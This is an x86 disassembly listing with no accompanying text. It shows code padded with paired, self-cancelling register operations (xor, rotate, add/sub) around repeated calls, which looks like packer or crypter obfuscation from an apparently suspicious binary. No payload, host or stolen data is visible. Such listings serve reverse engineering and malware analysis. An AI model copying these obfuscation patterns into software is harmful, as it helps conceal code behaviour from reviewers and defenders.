  403afd:	e8 05 13 00 00       	call   0x404e07
  403b02:	33 35 2d 9a 42 00    	xor    0x429a2d,%esi
  403b08:	c1 cf 02             	ror    $0x2,%edi
  403b0b:	33 fb                	xor    %ebx,%edi
  403b0d:	03 3d fd 99 42 00    	add    0x4299fd,%edi
  403b13:	e8 ef 12 00 00       	call   0x404e07
  403b18:	33 c6                	xor    %esi,%eax
  403b1a:	0b 05 db 9c 42 00    	or     0x429cdb,%eax
  403b20:	89 05 c7 96 42 00    	mov    %eax,0x4296c7
  403b26:	87 f3                	xchg   %esi,%ebx
  403b28:	01 05 34 95 42 00    	add    %eax,0x429534
  403b2e:	e8 8f d9 ff ff       	call   0x4014c2
  403b33:	81 f1 34 24 c5 23    	xor    $0x23c52434,%ecx
  403b39:	29 3d dc 96 42 00    	sub    %edi,0x4296dc
  403b3f:	0b 0d 3e 9c 42 00    	or     0x429c3e,%ecx
  403b45:	e8 fc e9 ff ff       	call   0x402546
  403b4a:	e8 ec 19 00 00       	call   0x40553b
  403b4f:	81 f1 34 24 c5 23    	xor    $0x23c52434,%ecx
  403b55:	87 f3                	xchg   %esi,%ebx
  403b57:	29 1d 1a 98 42 00    	sub    %ebx,0x42981a
  403b5d:	33 c6                	xor    %esi,%eax
  403b5f:	e8 5e d9 ff ff       	call   0x4014c2
  403b64:	33 fb                	xor    %ebx,%edi
  403b66:	c1 c7 02             	rol    $0x2,%edi
  403b69:	e8 97 da ff ff       	call   0x401605
  403b6e:	c1 c6 17             	rol    $0x17,%esi
  403b71:	41                   	inc    %ecx
  403b72:	81 c7 49 5f 54 ac    	add    $0xac545f49,%edi
  403b78:	c1 cb 1f             	ror    $0x1f,%ebx
  403b7b:	f7 de                	neg    %esi
  403b7d:	33 da                	xor    %edx,%ebx
  403b7f:	bf 7a 8a c9 df       	mov    $0xdfc98a7a,%edi
  403b84:	43                   	inc    %ebx
  403b85:	81 f3 d3 f4 59 23    	xor    $0x2359f4d3,%ebx
  403b8b:	29 0d 10 94 42 00    	sub    %ecx,0x429410
  403b91:	2b 1d 20 9f 42 00    	sub    0x429f20,%ebx
  403b97:	e8 6b 12 00 00       	call   0x404e07
  403b9c:	40                   	inc    %eax
  403b9d:	c1 c2 1b             	rol    $0x1b,%edx
  403ba0:	2b f1                	sub    %ecx,%esi
  403ba2:	21 35 25 93 42 00    	and    %esi,0x429325
  403ba8:	c1 cf 06             	ror    $0x6,%edi
  403bab:	f7 de                	neg    %esi
  403bad:	e8 c1 13 00 00       	call   0x404f73
  403bb2:	e8 61 dd ff ff       	call   0x401918
  403bb7:	f7 de                	neg    %esi
  403bb9:	c1 c7 06             	rol    $0x6,%edi
  403bbc:	09 0d c2 95 42 00    	or     %ecx,0x4295c2
  403bc2:	03 f1                	add    %ecx,%esi
  403bc4:	c1 ca 1b             	ror    $0x1b,%edx
  403bc7:	48                   	dec    %eax
  403bc8:	01 05 b7 97 42 00    	add    %eax,0x4297b7
  403bce:	81 f3 d3 f4 59 23    	xor    $0x2359f4d3,%ebx
  403bd4:	4b                   	dec    %ebx
  403bd5:	81 c7 8f dd 67 dd    	add    $0xdd67dd8f,%edi
  403bdb:	29 1d c8 95 42 00    	sub    %ebx,0x4295c8
  403be1:	03 c5                	add    %ebp,%eax
  403be3:	89 15 c8 95 42 00    	mov    %edx,0x4295c8
  403be9:	87 d7                	xchg   %edx,%edi
  403beb:	f7 da                	neg    %edx
  403bed:	47                   	inc    %edi
  403bee:	e8 5d f6 ff ff       	call   0x403250
  403bf3:	c1 cb 17             	ror    $0x17,%ebx
  403bf6:	e8 bf 22 00 00       	call   0x405eba
  403bfb:	e8 07 12 00 00       	call   0x404e07
  403c00:	c1 c3 17             	rol    $0x17,%ebx
  403c03:	e8 1f f0 ff ff       	call   0x402c27
  403c08:	4f                   	dec    %edi
  403c09:	f7 da                	neg    %edx
  403c0b:	87 d7                	xchg   %edx,%edi
  403c0d:	29 3d 48 94 42 00    	sub    %edi,0x429448
  403c13:	2b c5                	sub    %ebp,%eax
  403c15:	31 0d 25 98 42 00    	xor    %ecx,0x429825
  403c1b:	81 f7 09 68 31 bd    	xor    $0xbd316809,%edi
  403c21:	c1 ca 19             	ror    $0x19,%edx
  403c24:	21 0d 78 98 42 00    	and    %ecx,0x429878
  403c2a:	03 15 51 9f 42 00    	add    0x429f51,%edx
  403c30:	e8 d2 11 00 00       	call   0x404e07
  403c35:	0b 35 1f 9b 42 00    	or     0x429b1f,%esi
  403c3b:	f7 df                	neg    %edi
  403c3d:	e8 c5 11 00 00       	call   0x404e07
  403c42:	81 f2 52 0e 7e 69    	xor    $0x697e0e52,%edx
  403c48:	4a                   	dec    %edx
  403c49:	81 f2 86 d2 2b 60    	xor    $0x602bd286,%edx
  403c4f:	f7 d3                	not    %ebx
  403c51:	81 f3 8c 98 4e ce    	xor    $0xce4e988c,%ebx
  403c57:	31 35 91 96 42 00    	xor    %esi,0x429691
  403c5d:	2b cd                	sub    %ebp,%ecx
  403c5f:	21 0d 25 97 42 00    	and    %ecx,0x429725
  403c65:	0b 3d 85 9f 42 00    	or     0x429f85,%edi
  403c6b:	33 3d 04 9c 42 00    	xor    0x429c04,%edi
  403c71:	33 f1                	xor    %ecx,%esi
  403c73:	c1 c9 18             	ror    $0x18,%ecx
  403c76:	31 0d 95 93 42 00    	xor    %ecx,0x429395
  403c7c:	e8 25 f6 ff ff       	call   0x4032a6
  403c81:	e8 89 15 00 00       	call   0x40520f
  403c86:	31 3d 5e 98 42 00    	xor    %edi,0x42985e
  403c8c:	c1 c1 18             	rol    $0x18,%ecx
  403c8f:	33 f1                	xor    %ecx,%esi
  403c91:	09 35 08 95 42 00    	or     %esi,0x429508
  403c97:	03 cd                	add    %ebp,%ecx
  403c99:	01 15 e5 95 42 00    	add    %edx,0x4295e5
  403c9f:	81 f3 8c 98 4e ce    	xor    $0xce4e988c,%ebx
  403ca5:	f7 d3                	not    %ebx
  403ca7:	81 f2 86 d2 2b 60    	xor    $0x602bd286,%edx
  403cad:	42                   	inc    %edx
  403cae:	81 f2 52 0e 7e 69    	xor    $0x697e0e52,%edx
  403cb4:	e8 f1 f0 ff ff       	call   0x402daa
  403cb9:	f7 df                	neg    %edi
  403cbb:	e8 47 11 00 00       	call   0x404e07
  403cc0:	c1 c2 19             	rol    $0x19,%edx
  403cc3:	57                   	push   %edi
  403cc4:	89 0d 83 97 42 00    	mov    %ecx,0x429783
  403cca:	33 35 cb 9d 42 00    	xor    0x429dcb,%esi
  403cd0:	81 f1 e3 73 50 71    	xor    $0x715073e3,%ecx
  403cd6:	01 0d 9e 96 42 00    	add    %ecx,0x42969e
  403cdc:	09 05 a3 95 42 00    	or     %eax,0x4295a3
  403ce2:	87 c6                	xchg   %eax,%esi
  403ce4:	46                   	inc    %esi
  403ce5:	09 15 33 94 42 00    	or     %edx,0x429433
  403ceb:	4b                   	dec    %ebx
  403cec:	81 eb 5c 94 a7 38    	sub    $0x38a7945c,%ebx
  403cf2:	81 c3 5c 94 a7 38    	add    $0x38a7945c,%ebx
  403cf8:	43                   	inc    %ebx
  403cf9:	31 0d a0 96 42 00    	xor    %ecx,0x4296a0
  403cff:	4e                   	dec    %esi
  403d00:	87 c6                	xchg   %eax,%esi
  403d02:	29 15 96 95 42 00    	sub    %edx,0x429596
  403d08:	81 f1 e3 73 50 71    	xor    $0x715073e3,%ecx
  403d0e:	01 15 79 93 42 00    	add    %edx,0x429379
  403d14:	bf 41 86 71 b9       	mov    $0xb9718641,%edi
  403d19:	f7 d6                	not    %esi
  403d1b:	e8 e7 10 00 00       	call   0x404e07
  403d20:	f7 de                	neg    %esi
  403d22:	42                   	inc    %edx
  403d23:	c1 c9 11             	ror    $0x11,%ecx
  403d26:	e8 dc 10 00 00       	call   0x404e07
  403d2b:	01 05 6b 96 42 00    	add    %eax,0x42966b
  403d31:	81 f2 71 6d 79 de    	xor    $0xde796d71,%edx
  403d37:	e8 96 11 00 00       	call   0x404ed2
  403d3c:	c1 c2 15             	rol    $0x15,%edx
  403d3f:	31 0d d3 94 42 00    	xor    %ecx,0x4294d3
  403d45:	2b ca                	sub    %edx,%ecx
  403d47:	f7 d6                	not    %esi
  403d49:	2b 1d b5 9e 42 00    	sub    0x429eb5,%ebx
  403d4f:	46                   	inc    %esi
  403d50:	81 35 8c 98 42 00 c7 	xorl   $0x85ed78c7,0x42988c
  403d57:	78 ed 85 
  403d5a:	0b 05 d2 9e 42 00    	or     0x429ed2,%eax
  403d60:	e8 5d d7 ff ff       	call   0x4014c2
  403d65:	e8 9d 10 00 00       	call   0x404e07
  403d6a:	81 05 73 95 42 00 a6 	addl   $0xefab6a6,0x429573
  403d71:	b6 fa 0e 
  403d74:	4e                   	dec    %esi
  403d75:	f7 d6                	not    %esi
  403d77:	03 ca                	add    %edx,%ecx
  403d79:	01 3d 84 93 42 00    	add    %edi,0x429384
  403d7f:	c1 ca 15             	ror    $0x15,%edx
  403d82:	e8 1b e5 ff ff       	call   0x4022a2
  403d87:	81 f2 71 6d 79 de    	xor    $0xde796d71,%edx
  403d8d:	e8 30 d7 ff ff       	call   0x4014c2
  403d92:	c1 c1 11             	rol    $0x11,%ecx
  403d95:	4a                   	dec    %edx
  403d96:	f7 de                	neg    %esi
  403d98:	f7 d6                	not    %esi
  403d9a:	81 cf b2 2a 26 5d    	or     $0x5d262ab2,%edi
  403da0:	0b 0d f2 99 42 00    	or     0x4299f2,%ecx
  403da6:	03 c1                	add    %ecx,%eax
  403da8:	81 f2 c6 38 6c 5f    	xor    $0x5f6c38c6,%edx
  403dae:	33 fd                	xor    %ebp,%edi
  403db0:	0b 1d 9f 9a 42 00    	or     0x429a9f,%ebx
  403db6:	e8 4c 10 00 00       	call   0x404e07
  403dbb:	33 15 17 9f 42 00    	xor    0x429f17,%edx
  403dc1:	0b 05 1b 9a 42 00    	or     0x429a1b,%eax
  403dc7:	c1 ca 05             	ror    $0x5,%edx
  403dca:	87 f7                	xchg   %esi,%edi
  403dcc:	81 f1 d3 c5 c6 0e    	xor    $0xec6c5d3,%ecx
  403dd2:	81 c0 1c 11 89 a7    	add    $0xa789111c,%eax
  403dd8:	c1 c0 09             	rol    $0x9,%eax
  403ddb:	e8 38 db ff ff       	call   0x401918
  403de0:	c1 c8 09             	ror    $0x9,%eax
  403de3:	81 e8 1c 11 89 a7    	sub    $0xa789111c,%eax
  403de9:	81 f1 d3 c5 c6 0e    	xor    $0xec6c5d3,%ecx
  403def:	87 f7                	xchg   %esi,%edi
  403df1:	c1 c2 05             	rol    $0x5,%edx
  403df4:	33 fd                	xor    %ebp,%edi
  403df6:	81 f2 c6 38 6c 5f    	xor    $0x5f6c38c6,%edx
  403dfc:	2b c1                	sub    %ecx,%eax
  403dfe:	81 c7 79 bd f7 65    	add    $0x65f7bd79,%edi
  403e04:	03 0d d9 9e 42 00    	add    0x429ed9,%ecx
  403e0a:	03 d7                	add    %edi,%edx
  403e0c:	e8 3f f4 ff ff       	call   0x403250
  403e11:	f7 de                	neg    %esi
  403e13:	40                   	inc    %eax
  403e14:	33 1d 3b 9f 42 00    	xor    0x429f3b,%ebx
  403e1a:	c1 cb 02             	ror    $0x2,%ebx
  403e1d:	89 35 15 98 42 00    	mov    %esi,0x429815
  403e23:	81 c0 af 3a 82 fe    	add    $0xfe823aaf,%eax
  403e29:	0b 1d 01 9b 42 00    	or     0x429b01,%ebx
  403e2f:	e8 d3 0f 00 00       	call   0x404e07
  403e34:	46                   	inc    %esi
  403e35:	f7 da                	neg    %edx
  403e37:	33 dc                	xor    %esp,%ebx
  403e39:	81 05 75 96 42 00 e2 	addl   $0x210c50e2,0x429675
  403e40:	50 0c 21 
  403e43:	03 da                	add    %edx,%ebx
  403e45:	81 f3 2b a7 da 46    	xor    $0x46daa72b,%ebx
  403e4b:	e8 cb e2 ff ff       	call   0x40211b
  403e50:	e8 b2 0f 00 00       	call   0x404e07
  403e55:	81 f3 2b a7 da 46    	xor    $0x46daa72b,%ebx
  403e5b:	2b da                	sub    %edx,%ebx
  403e5d:	81 05 ee 97 42 00 a2 	addl   $0x4cc953a2,0x4297ee
  403e64:	53 c9 4c 
  403e67:	33 dc                	xor    %esp,%ebx
  403e69:	f7 da                	neg    %edx
  403e6b:	4e                   	dec    %esi
  403e6c:	e8 96 0f 00 00       	call   0x404e07
  403e71:	81 e8 af 3a 82 fe    	sub    $0xfe823aaf,%eax
  403e77:	01 1d 91 98 42 00    	add    %ebx,0x429891
  403e7d:	c1 c3 02             	rol    $0x2,%ebx
  403e80:	48                   	dec    %eax
  403e81:	f7 de                	neg    %esi
  403e83:	e8 bb de ff ff       	call   0x401d43
  403e88:	2b d7                	sub    %edi,%edx
  403e8a:	57                   	push   %edi
  403e8b:	09 05 60 93 42 00    	or     %eax,0x429360
  403e91:	03 1d 0e 9b 42 00    	add    0x429b0e,%ebx
  403e97:	31 15 ae 96 42 00    	xor    %edx,0x4296ae
  403e9d:	0b 0d e2 9c 42 00    	or     0x429ce2,%ecx
  403ea3:	29 1d 81 96 42 00    	sub    %ebx,0x429681
  403ea9:	e8 57 d7 ff ff       	call   0x401605
  403eae:	c1 c0 09             	rol    $0x9,%eax
  403eb1:	33 d9                	xor    %ecx,%ebx
  403eb3:	c1 ce 0f             	ror    $0xf,%esi
  403eb6:	81 f1 3c ba e0 81    	xor    $0x81e0ba3c,%ecx
  403ebc:	f7 da                	neg    %edx
  403ebe:	29 05 2b 93 42 00    	sub    %eax,0x42932b
  403ec4:	81 f0 b4 08 24 df    	xor    $0xdf2408b4,%eax
  403eca:	e8 63 26 00 00       	call   0x406532
  403ecf:	e8 4a 19 00 00       	call   0x40581e
  403ed4:	81 f0 b4 08 24 df    	xor    $0xdf2408b4,%eax
  403eda:	f7 da                	neg    %edx
  403edc:	81 f1 3c ba e0 81    	xor    $0x81e0ba3c,%ecx
  403ee2:	c1 c6 0f             	rol    $0xf,%esi
  403ee5:	33 d9                	xor    %ecx,%ebx
  403ee7:	c1 c8 09             	ror    $0x9,%eax
  403eea:	e8 18 0f 00 00       	call   0x404e07
  403eef:	29 15 50 99 42 00    	sub    %edx,0x429950
  403ef5:	21 05 1e 97 42 00    	and    %eax,0x42971e
  403efb:	bf 34 57 c7 ba       	mov    $0xbac75734,%edi
  403f00:	4e                   	dec    %esi
  403f01:	81 c1 a2 4b 65 6d    	add    $0x6d654ba2,%ecx
  403f07:	c1 cb 13             	ror    $0x13,%ebx
  403f0a:	33 c6                	xor    %esi,%eax
  403f0c:	87 d3                	xchg   %edx,%ebx
  403f0e:	c1 c3 17             	rol    $0x17,%ebx
  403f11:	33 fe                	xor    %esi,%edi
  403f13:	c1 c2 0f             	rol    $0xf,%edx
  403f16:	81 e8 43 5b 66 ed    	sub    $0xed665b43,%eax
  403f1c:	2b 05 5f 9e 42 00    	sub    0x429e5f,%eax
  403f22:	e8 e0 0e 00 00       	call   0x404e07
  403f27:	89 35 6c 96 42 00    	mov    %esi,0x42966c
  403f2d:	f7 d6                	not    %esi
  403f2f:	03 15 f8 9c 42 00    	add    0x429cf8,%edx
  403f35:	c1 c1 1f             	rol    $0x1f,%ecx
  403f38:	81 f0 38 97 4e f5    	xor    $0xf54e9738,%eax
  403f3e:	e8 c4 0e 00 00       	call   0x404e07
  403f43:	e8 bf 0e 00 00       	call   0x404e07
  403f48:	81 f0 38 97 4e f5    	xor    $0xf54e9738,%eax
  403f4e:	c1 c9 1f             	ror    $0x1f,%ecx
  403f51:	f7 d6                	not    %esi
  403f53:	81 c0 43 5b 66 ed    	add    $0xed665b43,%eax
  403f59:	c1 ca 0f             	ror    $0xf,%edx
  403f5c:	33 fe                	xor    %esi,%edi
  403f5e:	c1 cb 17             	ror    $0x17,%ebx
  403f61:	87 d3                	xchg   %edx,%ebx
  403f63:	33 c6                	xor    %esi,%eax
  403f65:	c1 c3 13             	rol    $0x13,%ebx
  403f68:	81 e9 a2 4b 65 6d    	sub    $0x6d654ba2,%ecx
  403f6e:	46                   	inc    %esi
  403f6f:	81 e7 47 dd 4a ec    	and    $0xec4add47,%edi
  403f75:	c1 c1 1e             	rol    $0x1e,%ecx
  403f78:	f7 db                	neg    %ebx
  403f7a:	e8 9c e1 ff ff       	call   0x40211b
  403f7f:	2b 05 71 9d 42 00    	sub    0x429d71,%eax
  403f85:	81 ee 0b 05 82 d6    	sub    $0xd682050b,%esi
  403f8b:	f7 d6                	not    %esi
  403f8d:	c1 c3 02             	rol    $0x2,%ebx
  403f90:	f7 d6                	not    %esi
  403f92:	c1 c2 01             	rol    $0x1,%edx
  403f95:	f7 d0                	not    %eax
  403f97:	c1 c2 1f             	rol    $0x1f,%edx
  403f9a:	81 0d ce 98 42 00 1e 	orl    $0xb3283e1e,0x4298ce
  403fa1:	3e 28 b3 
  403fa4:	2b 35 ae 9b 42 00    	sub    0x429bae,%esi
  403faa:	e8 60 12 00 00       	call   0x40520f
  403faf:	c1 ca 1f             	ror    $0x1f,%edx
  403fb2:	f7 d0                	not    %eax
  403fb4:	c1 ca 01             	ror    $0x1,%edx
  403fb7:	f7 d6                	not    %esi
  403fb9:	c1 cb 02             	ror    $0x2,%ebx
  403fbc:	f7 d6                	not    %esi
  403fbe:	81 c6 0b 05 82 d6    	add    $0xd682050b,%esi
  403fc4:	e8 3e 0e 00 00       	call   0x404e07
  403fc9:	f7 db                	neg    %ebx
  403fcb:	c1 c9 1e             	ror    $0x1e,%ecx
  403fce:	81 ef 8f f3 d5 66    	sub    $0x66d5f38f,%edi
  403fd4:	89 1d 5a 96 42 00    	mov    %ebx,0x42965a
  403fda:	0b 1d 1e 9a 42 00    	or     0x429a1e,%ebx
  403fe0:	4a                   	dec    %edx
  403fe1:	21 05 d5 98 42 00    	and    %eax,0x4298d5
  403fe7:	29 3d 07 93 42 00    	sub    %edi,0x429307
  403fed:	c1 ca 06             	ror    $0x6,%edx
  403ff0:	81 05 ab 93 42 00 b9 	addl   $0x2b2118b9,0x4293ab
  403ff7:	18 21 2b 
  403ffa:	0b 0d 25 9c 42 00    	or     0x429c25,%ecx
  404000:	81 f0 1e 60 f0 0e    	xor    $0xef0601e,%eax
  404006:	0b 15 7c 9c 42 00    	or     0x429c7c,%edx
  40400c:	f7 d6                	not    %esi
  40400e:	2b 1d 66 9b 42 00    	sub    0x429b66,%ebx
  404014:	c1 c9 14             	ror    $0x14,%ecx
  404017:	e8 eb 0d 00 00       	call   0x404e07
  40401c:	81 0d 48 96 42 00 5e 	orl    $0x5973d45e,0x429648
  404023:	d4 73 59 
  404026:	09 3d 89 94 42 00    	or     %edi,0x429489
  40402c:	f7 d3                	not    %ebx
  40402e:	21 1d 1d 96 42 00    	and    %ebx,0x42961d
  404034:	01 05 c9 94 42 00    	add    %eax,0x4294c9
  40403a:	f7 d3                	not    %ebx
  40403c:	e8 c6 0d 00 00       	call   0x404e07
  404041:	c1 c1 14             	rol    $0x14,%ecx
  404044:	f7 d6                	not    %esi
  404046:	81 f0 1e 60 f0 0e    	xor    $0xef0601e,%eax
  40404c:	81 05 ae 95 42 00 af 	addl   $0xdcbae4af,0x4295ae
  404053:	e4 ba dc 
  404056:	c1 c2 06             	rol    $0x6,%edx
  404059:	29 35 37 95 42 00    	sub    %esi,0x429537
  40405f:	29 05 62 96 42 00    	sub    %eax,0x429662
  404065:	42                   	inc    %edx
  404066:	57                   	push   %edi
  404067:	c1 ca 07             	ror    $0x7,%edx
  40406a:	e8 98 0d 00 00       	call   0x404e07
  40406f:	0b 1d 33 9f 42 00    	or     0x429f33,%ebx
  404075:	e8 8d 0d 00 00       	call   0x404e07
  40407a:	40                   	inc    %eax
  40407b:	03 cd                	add    %ebp,%ecx
  40407d:	81 f0 ff 88 2a ce    	xor    $0xce2a88ff,%eax
  404083:	2b 05 88 9d 42 00    	sub    0x429d88,%eax
  404089:	09 35 6a 93 42 00    	or     %esi,0x42936a
  40408f:	4e                   	dec    %esi
  404090:	e8 ac da ff ff       	call   0x401b41
  404095:	2b 0d e1 9e 42 00    	sub    0x429ee1,%ecx
  40409b:	81 ee 54 24 f9 24    	sub    $0x24f92454,%esi
  4040a1:	81 f1 ff 2d c9 07    	xor    $0x7c92dff,%ecx
  4040a7:	03 15 5b 9a 42 00    	add    0x429a5b,%edx
  4040ad:	e8 55 0d 00 00       	call   0x404e07
  4040b2:	e8 04 e7 ff ff       	call   0x4027bb
  4040b7:	81 f1 ff 2d c9 07    	xor    $0x7c92dff,%ecx
  4040bd:	81 c6 54 24 f9 24    	add    $0x24f92454,%esi
  4040c3:	46                   	inc    %esi
  4040c4:	81 f0 ff 88 2a ce    	xor    $0xce2a88ff,%eax
  4040ca:	2b cd                	sub    %ebp,%ecx
  4040cc:	48                   	dec    %eax
  4040cd:	e8 49 e0 ff ff       	call   0x40211b
  4040d2:	c1 c2 07             	rol    $0x7,%edx
  4040d5:	bf 56 71 ce c9       	mov    $0xc9ce7156,%edi
  4040da:	2b fd                	sub    %ebp,%edi
  4040dc:	e8 26 0d 00 00       	call   0x404e07
  4040e1:	03 0d 95 9f 42 00    	add    0x429f95,%ecx
  4040e7:	c1 cf 04             	ror    $0x4,%edi
  4040ea:	2b 3d bc 9c 42 00    	sub    0x429cbc,%edi
  4040f0:	42                   	inc    %edx
  4040f1:	4e                   	dec    %esi
  4040f2:	31 1d 54 93 42 00    	xor    %ebx,0x429354
  4040f8:	2b 1d 32 9c 42 00    	sub    0x429c32,%ebx
  4040fe:	0b 0d 15 9b 42 00    	or     0x429b15,%ecx
  404104:	e8 58 e8 ff ff       	call   0x402961
  404109:	e8 10 17 00 00       	call   0x40581e
  40410e:	89 35 32 93 42 00    	mov    %esi,0x429332
  404114:	46                   	inc    %esi
  404115:	4a                   	dec    %edx
  404116:	c1 c7 04             	rol    $0x4,%edi
  404119:	03 fd                	add    %ebp,%edi
  40411b:	81 e7 c8 bb 61 a0    	and    $0xa061bbc8,%edi
  404121:	01 3d 0e 95 42 00    	add    %edi,0x42950e
  404127:	4e                   	dec    %esi
  404128:	33 1d c9 9c 42 00    	xor    0x429cc9,%ebx
  40412e:	01 35 46 95 42 00    	add    %esi,0x429546
  404134:	31 15 04 95 42 00    	xor    %edx,0x429504
  40413a:	f7 d8                	neg    %eax
  40413c:	46                   	inc    %esi
  40413d:	81 f1 a3 d9 93 fc    	xor    $0xfc93d9a3,%ecx
  404143:	03 15 d7 9a 42 00    	add    0x429ad7,%edx
  404149:	33 35 32 9f 42 00    	xor    0x429f32,%esi
  40414f:	e8 b3 0c 00 00       	call   0x404e07
  404154:	40                   	inc    %eax
  404155:	f7 d2                	not    %edx
  404157:	e8 5e 1d 00 00       	call   0x405eba
  40415c:	e8 a6 0c 00 00       	call   0x404e07
  404161:	f7 d2                	not    %edx
  404163:	48                   	dec    %eax
  404164:	e8 9e 0c 00 00       	call   0x404e07
  404169:	81 f1 a3 d9 93 fc    	xor    $0xfc93d9a3,%ecx
  40416f:	4e                   	dec    %esi
  404170:	f7 d8                	neg    %eax
  404172:	09 05 c0 97 42 00    	or     %eax,0x4297c0
  404178:	46                   	inc    %esi
  404179:	81 ef ea c7 cd 0b    	sub    $0xbcdc7ea,%edi
  40417f:	c1 c0 09             	rol    $0x9,%eax
  404182:	29 15 99 98 42 00    	sub    %edx,0x429899
  404188:	2b 15 87 9b 42 00    	sub    0x429b87,%edx
  40418e:	c1 ce 02             	ror    $0x2,%esi
  404191:	4a                   	dec    %edx
  404192:	09 1d e8 97 42 00    	or     %ebx,0x4297e8
  404198:	81 f3 5e 1d 37 a7    	xor    $0xa7371d5e,%ebx
  40419e:	43                   	inc    %ebx
  40419f:	01 1d be 96 42 00    	add    %ebx,0x4296be
  4041a5:	33 1d 5f 9e 42 00    	xor    0x429e5f,%ebx
  4041ab:	c1 c6 1b             	rol    $0x1b,%esi
  4041ae:	f7 de                	neg    %esi
  4041b0:	21 05 41 99 42 00    	and    %eax,0x429941
  4041b6:	01 1d 24 99 42 00    	add    %ebx,0x429924
  4041bc:	29 15 e2 96 42 00    	sub    %edx,0x4296e2
  4041c2:	42                   	inc    %edx
  4041c3:	e8 b5 dc ff ff       	call   0x401e7d
  4041c8:	4a                   	dec    %edx
  4041c9:	89 0d 48 94 42 00    	mov    %ecx,0x429448
  4041cf:	09 05 4f 93 42 00    	or     %eax,0x42934f
  4041d5:	f7 de                	neg    %esi
  4041d7:	c1 ce 1b             	ror    $0x1b,%esi
  4041da:	4b                   	dec    %ebx
  4041db:	81 f3 5e 1d 37 a7    	xor    $0xa7371d5e,%ebx
  4041e1:	89 15 4d 97 42 00    	mov    %edx,0x42974d
  4041e7:	42                   	inc    %edx
  4041e8:	c1 c6 02             	rol    $0x2,%esi
  4041eb:	c1 c8 09             	ror    $0x9,%eax
  4041ee:	57                   	push   %edi
  4041ef:	81 e9 90 da 79 ed    	sub    $0xed79da90,%ecx
  4041f5:	f7 de                	neg    %esi
  4041f7:	81 e8 b1 90 80 6b    	sub    $0x6b8090b1,%eax
  4041fd:	c1 c2 07             	rol    $0x7,%edx
  404200:	0b 05 b8 9d 42 00    	or     0x429db8,%eax
  404206:	33 35 05 9f 42 00    	xor    0x429f05,%esi
  40420c:	0b 1d 3e 9a 42 00    	or     0x429a3e,%ebx
  404212:	c1 ca 16             	ror    $0x16,%edx
  404215:	33 35 56 9f 42 00    	xor    0x429f56,%esi
  40421b:	4b                   	dec    %ebx
  40421c:	03 3d 8a 9e 42 00    	add    0x429e8a,%edi
  404222:	81 05 60 93 42 00 f3 	addl   $0xe74984f3,0x429360
  404229:	84 49 e7 
  40422c:	2b 35 91 9f 42 00    	sub    0x429f91,%esi
  404232:	21 1d 50 98 42 00    	and    %ebx,0x429850
  404238:	48                   	dec    %eax
  404239:	81 f7 0a 86 cf 72    	xor    $0x72cf860a,%edi
  40423f:	e8 c3 0b 00 00       	call   0x404e07
  404244:	e8 e9 22 00 00       	call   0x406532
  404249:	81 f7 0a 86 cf 72    	xor    $0x72cf860a,%edi
  40424f:	40                   	inc    %eax
  404250:	43                   	inc    %ebx
  404251:	c1 c2 16             	rol    $0x16,%edx
  404254:	c1 ca 07             	ror    $0x7,%edx
  404257:	81 c0 b1 90 80 6b    	add    $0x6b8090b1,%eax
  40425d:	f7 de                	neg    %esi
  40425f:	81 c1 90 da 79 ed    	add    $0xed79da90,%ecx
  404265:	54                   	push   %esp
  404266:	40                   	inc    %eax
  404267:	c1 ca 1d             	ror    $0x1d,%edx
  40426a:	40                   	inc    %eax
  40426b:	81 c7 c6 22 66 fa    	add    $0xfa6622c6,%edi
  404271:	87 f7                	xchg   %esi,%edi
  404273:	01 15 f1 98 42 00    	add    %edx,0x4298f1
  404279:	33 1d 33 9c 42 00    	xor    0x429c33,%ebx
  40427f:	47                   	inc    %edi
  404280:	81 eb 16 92 15 82    	sub    $0x82159216,%ebx
  404286:	e8 7c 0b 00 00       	call   0x404e07
  40428b:	81 f0 b0 1e 46 22    	xor    $0x22461eb0,%eax
  404291:	0b 15 f7 9e 42 00    	or     0x429ef7,%edx
  404297:	81 e9 84 ae bb 90    	sub    $0x90bbae84,%ecx
  40429d:	81 0d 51 99 42 00 3a 	orl    $0xfd2f183a,0x429951
  4042a4:	18 2f fd 
  4042a7:	81 05 6a 95 42 00 da 	addl   $0xd0dd8bda,0x42956a
  4042ae:	8b dd d0 
  4042b1:	01 15 20 97 42 00    	add    %edx,0x429720
  4042b7:	4a                   	dec    %edx
  4042b8:	c1 ca 0e             	ror    $0xe,%edx
  4042bb:	e8 47 0b 00 00       	call   0x404e07
  4042c0:	c1 c2 0e             	rol    $0xe,%edx
  4042c3:	42                   	inc    %edx
  4042c4:	29 3d ce 97 42 00    	sub    %edi,0x4297ce
  4042ca:	81 2d b6 97 42 00 bd 	subl   $0x9b6ca2bd,0x4297b6
  4042d1:	a2 6c 9b 
  4042d4:	81 c1 84 ae bb 90    	add    $0x90bbae84,%ecx
  4042da:	81 f0 b0 1e 46 22    	xor    $0x22461eb0,%eax
  4042e0:	e8 22 0b 00 00       	call   0x404e07
  4042e5:	81 c3 16 92 15 82    	add    $0x82159216,%ebx
  4042eb:	4f                   	dec    %edi
  4042ec:	01 35 f9 95 42 00    	add    %esi,0x4295f9
  4042f2:	87 f7                	xchg   %esi,%edi
  4042f4:	81 ef c6 22 66 fa    	sub    $0xfa6622c6,%edi
  4042fa:	48                   	dec    %eax
  4042fb:	c1 c2 1d             	rol    $0x1d,%edx
  4042fe:	48                   	dec    %eax
  4042ff:	50                   	push   %eax
  404300:	f7 de                	neg    %esi
  404302:	e8 bb d1 ff ff       	call   0x4014c2
  404307:	87 d7                	xchg   %edx,%edi
  404309:	33 35 84 9e 42 00    	xor    0x429e84,%esi
  40430f:	09 15 41 96 42 00    	or     %edx,0x429641
  404315:	87 d3                	xchg   %edx,%ebx
  404317:	31 3d 3d 93 42 00    	xor    %edi,0x42933d
  40431d:	e8 e5 0a 00 00       	call   0x404e07
  404322:	03 3d a6 9c 42 00    	add    0x429ca6,%edi
  404328:	e8 db e1 ff ff       	call   0x402508
  40432d:	c1 c2 1e             	rol    $0x1e,%edx
  404330:	01 35 b8 93 42 00    	add    %esi,0x4293b8
  404336:	4e                   	dec    %esi
  404337:	81 f1 8f e8 94 ef    	xor    $0xef94e88f,%ecx
  40433d:	c1 ce 0c             	ror    $0xc,%esi
  404340:	c1 c6 0c             	rol    $0xc,%esi
  404343:	81 f1 8f e8 94 ef    	xor    $0xef94e88f,%ecx
  404349:	46                   	inc    %esi
  40434a:	09 35 34 96 42 00    	or     %esi,0x429634
  404350:	c1 ca 1e             	ror    $0x1e,%edx
  404353:	e8 7a 0b 00 00       	call   0x404ed2
  404358:	09 1d d3 95 42 00    	or     %ebx,0x4295d3
  40435e:	87 d3                	xchg   %edx,%ebx
